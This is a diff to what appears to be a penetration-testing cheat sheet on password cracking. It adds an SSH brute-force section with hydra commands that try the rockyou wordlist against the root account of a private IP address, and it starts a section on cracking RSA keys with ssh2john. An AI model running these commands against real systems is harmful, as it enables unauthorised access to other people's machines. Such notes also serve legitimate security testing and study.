@@ -1,5 +1,13 @@
 # Password Crack Methods
 
+## SSH Bruteforce
+
+```
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh -s 22022 //-s for different port
+```
+
 ## RSA Private Key crack using ssh2john
 
 1. Link to download tool
